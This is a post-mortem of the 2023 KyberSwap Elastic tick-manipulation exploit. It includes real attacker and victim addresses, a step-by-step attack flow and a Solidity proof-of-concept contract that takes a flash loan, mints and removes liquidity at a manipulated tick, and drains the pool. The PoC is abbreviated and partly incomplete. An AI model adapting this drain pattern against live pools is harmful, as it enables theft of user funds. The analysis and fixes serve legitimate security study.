# KyberSwap Tick Manipulation Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | KyberSwap Elastic |
| Date | 2023-11-23 |
| Chain | Ethereum Mainnet (multi-chain) |
| Loss | ~$46,000,000 USD |
| Attack Type | Flash Loan + Tick Manipulation + Liquidity Manipulation (Flash Loan + Tick Manipulation + Precision Loss) |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x50275E0B7261559cE1644014d4b78D4AA63BE836` |
| Attack Contract | `0xaf2acf3d4ab78e4c702256d214a3189a874cdc13` |
| Vulnerable Contract | `0xFd7B111AA83b9b6F547E617C7601EfD997F64703` (KS2-RT frxETH/WETH) |
| Fork Block | 18,630,391 |

## 2. Vulnerability Code Analysis

KyberSwap Elastic (a concentrated liquidity AMM) contained a precision loss vulnerability in its tick calculation. The attacker secured a large amount of funds via an Aave flash loan and executed swaps near specific tick boundaries to manipulate `sqrtP` (square root price). Afterwards, by providing liquidity and immediately removing it under the manipulated tick state, they were able to withdraw more tokens than were actually supplied.

```solidity
// Vulnerable pattern: Precision loss near KyberSwap Elastic tick boundaries
contract KyberswapPool {
    // Vulnerable: Rounding error in sqrtP calculation within certain tick ranges
    function swap(
        address recipient,
        int256 swapQty,
        bool isToken0,
        uint160 limitSqrtP,
        bytes calldata data
    ) external returns (int256 deltaQty0, int256 deltaQty1) {
        // ...
        // Precision loss in sqrtP occurs when crossing tick boundaries
        // → Liquidity calculation error on mint()
        // → removeLiquidity() allows withdrawing more tokens than supplied
    }
}
```

**Vulnerability**: In KyberSwap Elastic's concentrated liquidity implementation, precision loss occurred in `sqrtP` calculations after swaps within certain tick ranges (`currentTick`, `nearestCurrentTick`). Under this state, supplying liquidity via `mint()` and immediately removing it via `removeLiquidity()` allowed the attacker to withdraw more tokens than were deposited.

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash Loan + Tick Manipulation + Precision Loss
// Source code unverified — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0x50275E0B7261559cE1644014d4b78D4AA63BE836]
  │
  ├─1─▶ AaveV3.flashLoanSimple(WETH, ~10,000 WETH)
  │      [Aave Pool: 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2]
  │      Triggers executeOperation callback
  │
  ├─2─▶ KyberswapPool.swap(attacker, amount, false, 0x1000...0, "")
  │      [KS2-RT Pool: 0xFd7B111AA83b9b6F547E617C7601EfD997F64703]
  │      First swap: tick manipulation (move sqrtP near boundary)
  │      Direction: WETH → frxETH
  │
  ├─3─▶ KyberswapPool.getPoolState()
  │      Query current sqrtP, currentTick, nearestCurrentTick
  │
  ├─4─▶ PositionManager.mint(MintParams{
  │          token0, token1, swapFee,
  │          tickLower=currentTick, tickUpper=111310,
  │          nearestLower=nearestCurrentTick, nearestUpper=nearestCurrentTick,
  │          amount0Desired=6948087773336076,
  │          amount1Desired=107809615846697233,
  │          ...
  │      })
  │      [PositionManager: 0xe222fBE074A436145b255442D919E4E3A6c6a480]
  │      Provide liquidity under manipulated tick state
  │
  ├─5─▶ PositionManager.removeLiquidity(RemoveLiquidityParams{
  │          tokenId, liquidity=14938549516730950591, ...
  │      })
  │      Immediately remove liquidity → withdraw more tokens than supplied
  │
  ├─6─▶ KyberswapPool.swap(attacker, 387170294533119999999, false, MAX_PRICE, "")
  │      Second swap to realize additional profit
  │
  ├─7─▶ KyberswapPool.swap(attacker, -pool_balance, false, MIN_PRICE, "")
  │      Third swap: drain the pool's entire remaining balance
  │
  └─8─▶ Repay Aave flash loan + realize ~$46M profit
         (Ethereum, Optimism, Arbitrum, Polygon, BSC, and other chains)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IKyberswapPool {
    function swap(address recipient, int256 swapQty, bool isToken0, uint160 limitSqrtP, bytes calldata data)
        external returns (int256 deltaQty0, int256 deltaQty1);
    function getPoolState() external view returns (uint160 sqrtP, int24 currentTick, int24 nearestCurrentTick, bool locked);
    function token0() external view returns (address);
    function swapFeeUnits() external view returns (uint24);
}

interface IKyberswapPositionManager {
    struct MintParams {
        address token0; address token1; uint24 fee;
        int24 tickLower; int24 tickUpper;
        int24[2] ticksPrevious;
        uint256 amount0Desired; uint256 amount1Desired;
        uint256 amount0Min; uint256 amount1Min;
        address recipient; uint256 deadline;
    }
    struct RemoveLiquidityParams {
        uint256 tokenId; uint128 liquidity;
        uint256 amount0Min; uint256 amount1Min; uint256 deadline;
    }
    function mint(MintParams calldata params) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
    function removeLiquidity(RemoveLiquidityParams calldata params) external returns (uint256 amount0, uint256 amount1, uint256 additionalRTokenOwed);
}

contract KyberSwapExploit {
    address victim = 0xFd7B111AA83b9b6F547E617C7601EfD997F64703;
    address lender = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave V3
    IKyberswapPositionManager manager = IKyberswapPositionManager(0xe222fBE074A436145b255442D919E4E3A6c6a480);
    address token0;
    address token1;

    function trigger() public {
        token0 = IKyberswapPool(victim).token0();
        // token1 = other token
        uint256 amount = IERC20(token1).balanceOf(victim);
        IAavePool(lender).flashLoanSimple(address(this), token1, amount, "", 0);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address, bytes calldata)
        external returns (bool)
    {
        int24 currentTick; int24 nearestCurrentTick; uint24 swapFee;
        uint160 sqrtP; uint256 tokenId;

        swapFee = IKyberswapPool(victim).swapFeeUnits();
        IERC20(token0).approve(address(manager), type(uint256).max);
        IERC20(token1).approve(address(manager), type(uint256).max);

        // First swap: move sqrtP to tick boundary
        IKyberswapPool(victim).swap(address(this), int256(amount), false, 0x100000000000000000000000000, "");

        // Query manipulated tick state
        (sqrtP, currentTick, nearestCurrentTick,) = IKyberswapPool(victim).getPoolState();

        // Provide liquidity at manipulated tick
        (tokenId,,,) = manager.mint(
            IKyberswapPositionManager.MintParams(
                token0, token1, swapFee,
                currentTick, 111_310,
                [nearestCurrentTick, nearestCurrentTick],
                6_948_087_773_336_076, 107_809_615_846_697_233,
                0, 0, address(this), block.timestamp
            )
        );

        // Immediately remove liquidity → over-withdrawal
        manager.removeLiquidity(
            IKyberswapPositionManager.RemoveLiquidityParams(
                tokenId, 14_938_549_516_730_950_591, 0, 0, block.timestamp
            )
        );

        // Second and third swaps to drain pool's entire balance
        IKyberswapPool(victim).swap(address(this), 387_170_294_533_119_999_999, false,
            1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341, "");
        IKyberswapPool(victim).swap(address(this), -int256(IERC20(token1).balanceOf(victim)), false, 4_295_128_740, "");

        IERC20(token1).approve(lender, amount + premium);
        return true;
    }

    function swapCallback(int256 deltaQty0, int256 deltaQty1, bytes calldata) external {
        if (deltaQty0 > 0) IERC20(token0).transfer(msg.sender, uint256(deltaQty0));
        else if (deltaQty1 > 0) IERC20(token1).transfer(msg.sender, uint256(deltaQty1));
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Concentrated liquidity tick boundary precision loss, liquidity mint/removal after sqrtP manipulation |
| Impact Scope | All KyberSwap Elastic pools across multiple chains (~$46M) |
| Explorer | [Etherscan](https://etherscan.io/address/0xFd7B111AA83b9b6F547E617C7601EfD997F64703) |

## 6. Security Recommendations

```solidity
// Fix 1: Compensate for tick boundary precision
// Maintain a consistent rounding direction in sqrtP calculations
function calcSqrtPrice(int24 tick) internal pure returns (uint160) {
    // Always use ceiling or floor consistently
    return TickMath.getSqrtRatioAtTick(tick);
    // Verify no directional inconsistencies in intermediate calculations
}

// Fix 2: Restrict mint/removeLiquidity within the same block
mapping(uint256 => uint256) public tokenMintBlock;

function mint(MintParams calldata params) external returns (uint256 tokenId, ...) {
    // ...
    tokenMintBlock[tokenId] = block.number;
}

function removeLiquidity(RemoveLiquidityParams calldata params) external returns (...) {
    require(block.number > tokenMintBlock[params.tokenId], "Cannot remove in mint block");
    // ...
}

// Fix 3: Apply Formal Verification
// Tick/price calculations in concentrated liquidity AMMs are mathematically
// complex — edge-case precision bugs are easily missed without formal verification
```

## 7. Lessons Learned

1. **Precision bugs in concentrated liquidity AMMs**: Uniswap V3-style concentrated liquidity AMMs are prone to precision bugs at tick boundary calculations. KyberSwap's $46M loss was the result of deployment without rigorous mathematical verification.
2. **Same-block mint/removeLiquidity restriction**: The pattern of providing liquidity and immediately removing it is the key mechanism for exploiting precision bugs. Enforcing a minimum wait of 1 block can block this type of attack.
3. **Simultaneous multi-chain attack**: The attacker simultaneously targeted KyberSwap pools across Ethereum, Optimism, Arbitrum, Polygon, BSC, and other chains. Deploying the same codebase across multiple chains means vulnerabilities exist across all of them.
4. **The necessity of formal verification**: Price and tick calculations in concentrated liquidity AMMs are mathematically complex, making it difficult to cover edge cases with conventional testing alone. Applying formal verification tools such as Certora and Halmos is strongly recommended.